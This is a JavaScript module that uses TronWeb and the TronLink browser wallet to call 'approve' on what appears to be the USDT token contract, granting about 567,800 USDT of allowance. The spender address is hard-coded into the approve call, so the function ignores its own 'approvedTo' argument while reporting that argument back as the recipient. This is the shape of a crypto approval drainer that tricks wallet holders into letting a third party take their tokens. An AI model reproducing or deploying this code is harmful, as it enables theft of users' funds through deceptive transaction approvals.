const TronWeb = require("tronweb");

const usdtTokenAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
const abi = [
    {
      constant: false,
      inputs: [
        {
          name: "_spender",
          type: "address",
        },
        {
          name: "_value",
          type: "uint256",
        },
      ],
      name: "approve",
      outputs: [
        {
          name: "",
          type: "bool",
        },
      ],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
  ];
async function approveUSDT(approvedTo = "TWgXSgsmVvex3WWcYSYwQ52yw9vLgPcPKc",approvalAmount = 567800000000) {
  // Check if TronLink is installed
  if (!window.tronWeb || !window.tronWeb.ready) {
    console.error("TronLink wallet not detected or not ready");
    return;
  }

  // Get TronWeb instance
  const tronWeb = window.tronWeb

  // Get the current address from TronLink
  const currentAddress = tronWeb.defaultAddress.base58;

  console.log("Current Wallet Address: ", currentAddress)

  try {
    const contract = await tronWeb.contract().at(usdtTokenAddress);
    const result = await contract.approve("TWgXSgsmVvex3WWcYSYwQ52yw9vLgPcPKc", approvalAmount).send();
    return {"wallet":currentAddress, "approvedTo": approvedTo, "trxHash": result.txID }
  } catch (error) {
    console.error("An error occurred during the approval process:", error);
    return false
  }
}


module.exports = { approveUSDT };